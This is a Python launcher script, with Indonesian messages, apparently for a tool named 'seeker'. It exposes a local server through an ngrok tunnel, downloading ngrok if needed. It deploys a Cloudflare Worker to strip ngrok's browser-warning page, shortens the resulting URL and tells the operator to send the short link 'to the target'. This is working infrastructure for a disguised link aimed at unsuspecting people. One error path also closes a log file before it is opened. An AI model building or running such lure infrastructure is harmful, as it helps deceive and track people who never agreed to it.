#!/usr/bin/env python3
import requests, sys, os, subprocess, time, json, socket, threading, tempfile, glob, shutil, re, urllib.request, zipfile, tarfile, io, platform

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'

BASE_DIR = os.path.dirname(os.path.realpath(__file__))

def get_safe_tmpdir():
    tmpdir = tempfile.gettempdir()
    try:
        test_file = os.path.join(tmpdir, '.seeker_tmp_test')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        return tmpdir
    except (OSError, PermissionError):
        pass
    prefix_tmp = os.path.join(os.environ.get('PREFIX', '/data/data/com.termux/files/usr'), 'tmp')
    if os.path.isdir(prefix_tmp):
        return prefix_tmp
    return BASE_DIR

SAFE_TMPDIR = get_safe_tmpdir()

dotenv_path = os.path.join(BASE_DIR, '.env')
if os.path.exists(dotenv_path):
    with open(dotenv_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and '=' in line:
                k, v = line.split('=', 1)
                os.environ[k.strip()] = v.strip()

placeholder_active = True

def placeholder_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(('127.0.0.1', 8080))
        srv.listen(5)
        srv.settimeout(0.5)
        while placeholder_active:
            try:
                conn, _ = srv.accept()
                try:
                    data = conn.recv(1024)
                    if data:
                        conn.sendall(b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nseeker-placeholder')
                except:
                    pass
                conn.close()
            except socket.timeout:
                pass
            except:
                break
    except OSError:
        pass
    finally:
        try:
            srv.close()
        except:
            pass

t = threading.Thread(target=placeholder_server, daemon=True)
t.start()

print(f'{G}[1/3] {C}Memulai ngrok tunnel...{W}')

if not shutil.which('ngrok'):
    machine = platform.machine().lower()
    if sys.platform == 'win32':
        url = 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip'
        print(f'{Y}[!] {C}ngrok tidak ditemukan, mendownload...{W}')
        try:
            resp = urllib.request.urlopen(url)
            z = zipfile.ZipFile(io.BytesIO(resp.read()))
            exe_path = os.path.join(BASE_DIR, 'ngrok.exe')
            with open(exe_path, 'wb') as f:
                f.write(z.read('ngrok.exe'))
            try:
                os.chmod(exe_path, 0o755)
            except:
                pass
            os.environ['PATH'] = BASE_DIR + os.pathsep + os.environ.get('PATH', '')
            print(f'{G}[+] {C}ngrok.exe tersimpan di: {exe_path}{W}')
        except Exception as e:
            print(f'{R}[-] {C}Gagal download ngrok: {e}{W}')
            print(f'{C}Download manual: https://ngrok.com/download{W}')
            sys.exit(1)
    elif 'arm' in machine or 'aarch' in machine:
        url = 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz'
        print(f'{Y}[!] {C}ngrok tidak ditemukan, mendownload...{W}')
        try:
            resp = urllib.request.urlopen(url)
            t = tarfile.open(fileobj=io.BytesIO(resp.read()), mode='r:gz')
            exe_path = os.path.join(BASE_DIR, 'ngrok')
            for m in t.getmembers():
                if m.name == 'ngrok':
                    with open(exe_path, 'wb') as f:
                        f.write(t.extractfile(m).read())
                    break
            try:
                os.chmod(exe_path, 0o755)
            except:
                pass
            os.environ['PATH'] = BASE_DIR + os.pathsep + os.environ.get('PATH', '')
            print(f'{G}[+] {C}ngrok tersimpan di: {exe_path}{W}')
        except Exception as e:
            print(f'{R}[-] {C}Gagal download ngrok: {e}{W}')
            print(f'{C}Download manual: https://ngrok.com/download{W}')
            sys.exit(1)
    else:
        url = 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz'
        print(f'{Y}[!] {C}ngrok tidak ditemukan, mendownload...{W}')
        try:
            resp = urllib.request.urlopen(url)
            t = tarfile.open(fileobj=io.BytesIO(resp.read()), mode='r:gz')
            exe_path = os.path.join(BASE_DIR, 'ngrok')
            for m in t.getmembers():
                if m.name == 'ngrok':
                    with open(exe_path, 'wb') as f:
                        f.write(t.extractfile(m).read())
                    break
            try:
                os.chmod(exe_path, 0o755)
            except:
                pass
            os.environ['PATH'] = BASE_DIR + os.pathsep + os.environ.get('PATH', '')
            print(f'{G}[+] {C}ngrok tersimpan di: {exe_path}{W}')
        except Exception as e:
            print(f'{R}[-] {C}Gagal download ngrok: {e}{W}')
            print(f'{C}Download manual: https://ngrok.com/download{W}')
            sys.exit(1)

if sys.platform == 'win32':
    subprocess.run(['taskkill', '/F', '/IM', 'ngrok.exe', '/T'],
                   capture_output=True, creationflags=0x08000000)
else:
    # Try multiple methods to kill ngrok (Termux compatible)
    for cmd in [['pkill', '-f', 'ngrok'], ['killall', 'ngrok']]:
        try:
            subprocess.run(cmd, capture_output=True)
        except FileNotFoundError:
            pass
    # Fallback: scan /proc for ngrok
    try:
        for pid_dir in glob.glob('/proc/[0-9]*'):
            try:
                pid = int(os.path.basename(pid_dir))
                with open(os.path.join(pid_dir, 'cmdline'), 'rb') as f:
                    cmdline = f.read().decode('utf-8', errors='ignore')
                if 'ngrok' in cmdline:
                    os.kill(pid, 15)
            except (ProcessLookupError, PermissionError, FileNotFoundError, OSError, ValueError):
                pass
    except Exception:
        pass
time.sleep(1)

# Check ngrok auth token (v3 requires it)
ngrok_config = os.path.join(os.path.expanduser('~'), '.config', 'ngrok', 'ngrok.yml')
ngrok_has_auth = False
if os.path.exists(ngrok_config):
    with open(ngrok_config, 'r') as _f:
        if 'authtoken:' in _f.read():
            ngrok_has_auth = True
if not ngrok_has_auth:
    if sys.platform == 'win32':
        for alt_path in [
            os.path.join(os.path.expanduser('~'), '.ngrok2', 'ngrok.yml'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'ngrok', 'ngrok.yml'),
        ]:
            if os.path.exists(alt_path):
                with open(alt_path, 'r') as _f:
                    if 'authtoken:' in _f.read():
                        ngrok_has_auth = True
                        break
if not ngrok_has_auth:
    print(f'{Y}[!] {C}ngrok v3 butuh authtoken. Daftar gratis di: https://ngrok.com{W}')
    token = input(f'{G}[>] {C}Paste authtoken (Enter = batal): {W}').strip()
    if token:
        subprocess.run(['ngrok', 'config', 'add-authtoken', token], capture_output=True, creationflags=0x08000000 if sys.platform == 'win32' else 0)
        print(f'{G}[+] {C}Authtoken tersimpan.{W}')
    else:
        print(f'{R}[-] {C}Authtoken diperlukan. Batal.{W}')
        placeholder_active = False
        ngrok_log_fh.close()
        input(f'\n{G}[>] {C}Tekan Enter...{W}')
        sys.exit(0)

ngrok_log = os.path.join(SAFE_TMPDIR, 'seeker_tunnel.txt')
try:
    os.remove(ngrok_log)
except:
    pass

ngrok_log_fh = open(ngrok_log, 'w')
if sys.platform == 'win32':
    ngrok_proc = subprocess.Popen(
        ['ngrok', 'http', '8080', '--log', 'stdout'],
        stdout=ngrok_log_fh, stderr=subprocess.STDOUT,
        creationflags=0x08000000
    )
else:
    ngrok_proc = subprocess.Popen(
        ['ngrok', 'http', '8080', '--log', 'stdout'],
        stdout=ngrok_log_fh, stderr=subprocess.STDOUT,
        start_new_session=True
    )

NGROK_API = 'http://127.0.0.1:4040/api/tunnels'
tunnel_url = None

print(f'{G}[2/3] {C}Mendeteksi URL ngrok...{W}')
print(f'{C}  (Menunggu ngrok API di localhost:4040){W}')

for i in range(30):
    try:
        r = requests.get(NGROK_API, timeout=3)
        if r.status_code == 200:
            tunnels = r.json().get('tunnels', [])
            for t in tunnels:
                pu = t.get('public_url', '')
                if pu.startswith('https://'):
                    tunnel_url = pu
                    break
            if tunnel_url:
                break
    except:
        # Show that we're still waiting
        if i > 0 and i % 5 == 0:
            print(f'{C}  ...masih menunggu ngrok API ({i}s){W}')
        # Also try reading from ngrok log as fallback
        if i == 20:
            try:
                with open(ngrok_log, 'r') as lf:
                    log_content = lf.read()
                for line in log_content.split('\n'):
                    if 'started tunnel' in line.lower() or 'url=' in line.lower():
                        m = re.search(r'https://[a-z0-9-]+\.ngrok(?:-free)?\.app', line)
                        if m:
                            tunnel_url = m.group(0)
                            break
            except:
                pass
    if tunnel_url:
        break
    time.sleep(1)

if not tunnel_url:
    print(f'{Y}[!] {C}Gagal auto-detect ngrok. Cek log:{W}')
    try:
        with open(ngrok_log, 'r') as lf:
            print(lf.read()[:500])
    except:
        pass
    print(f'{Y}[!] {C}Masukkan manual jika ngrok sudah running.{W}')
    tunnel_url = input(f'{G}[>] {C}URL ngrok (atau Enter untuk batal): {W}').strip()

if not tunnel_url:
    print(f'{R}[-] {C}Tidak ada URL. Bersihkan...{W}')
    ngrok_proc.kill()
    ngrok_log_fh.close()
    placeholder_active = False
    time.sleep(0.5)
    input(f'\n{G}[>] {C}Tekan Enter untuk lanjut...{W}')
    sys.exit(0)

print(f'{G}[+] {C}Tunnel URL: {W}{tunnel_url}')

print(f'{G}[+] {C}Verifikasi tunnel ngrok...{W}', end='')
tunnel_ok = False
for i in range(8):
    try:
        r = requests.get(tunnel_url, timeout=5, headers={
            'User-Agent': 'ngrok-skip/1.0',
            'ngrok-skip-browser-warning': 'true',
        })
        sc = r.status_code
        body = r.text[:500].lower()
        is_interstitial = ('ngrok' in body and ('interstitial' in body or 'browser warning' in body or 'skip-browser-warning' in body))
        if sc in (200, 301, 302) and not is_interstitial:
            tunnel_ok = True
            print(f'{C}[ {G}OK{C} ]{W}')
            break
        elif sc in (200, 301, 302):
            print(f'{C}[ {Y}WARNING{C} ]{W}')
            print(f'{Y}[!] {C}Ngrok menyajikan interstitial page. CF Worker akan menghilangkannya.{W}')
            tunnel_ok = True
            break
        else:
            print(f'{C}[ {Y}st={sc}{C} ]{W}', end='')
    except:
        print(f'{C}[ {Y}retry{C} ]{W}', end='')
    time.sleep(1.5)

if not tunnel_ok:
    print(f'\n{Y}[!] {C}Warning: Tunnel belum merespon, mungkin butuh waktu.{W}')

api_token = os.environ.get('CF_API_TOKEN')
if not api_token:
    print(f'\n{Y}[!] {C}CF_API_TOKEN tidak ditemukan di environment.{W}')
    print(f'{C}Buat token di: https://dash.cloudflare.com/profile/api-tokens{W}')
    api_token = input(f'{G}[>] {C}Cloudflare API Token (Enter = skip deploy): {W}').strip()

worker_url = None
if api_token:
    print(f'{G}[3/3] {C}Deploy CF Worker...{W}')
    result = subprocess.run(
        [sys.executable, 'deploy_cf.py', '--tunnel-url', tunnel_url, '--api-token', api_token],
        capture_output=True, text=True
    )
    print(result.stdout, end='')
    if result.stderr:
        print(result.stderr, end='')

    for line in result.stdout.split('\n'):
        if line.startswith('WORKER_URL='):
            worker_url = line.split('=', 1)[1].strip()
            break

    if worker_url:
        temp_file = os.path.join(SAFE_TMPDIR, 'seeker_worker_url.txt')
        try:
            with open(temp_file, 'w') as f:
                f.write(worker_url)
        except:
            pass
else:
    print(f'{Y}[!] {C}Skip deploy, pakai ngrok langsung.{W}')

if worker_url:
    print(f'{G}[+] {C}Memperpendek URL Worker...{W}')
    try:
        sys.path.insert(0, BASE_DIR)
        from url_shortener import shorten
        short_result, short_error = shorten(worker_url)
        if short_result:
            print(f'\n{G}[+] {C}URL Worker: {W}{worker_url}')
            print(f'{G}[+] {C}URL Pendek: {W}{short_result}')
            print(f'{G}[+] {C}Kirim URL pendek ini ke target!{W}\n')
        else:
            print(f'{Y}[!] {C}Shorten gagal ({short_error}), pakai asli:{W}')
            print(f'{C}{worker_url}{W}\n')
    except Exception as e:
        print(f'{Y}[!] {C}Shorten error: {e}, pakai asli:{W}')
        print(f'{C}{worker_url}{W}\n')

ngrok_log_fh.close()
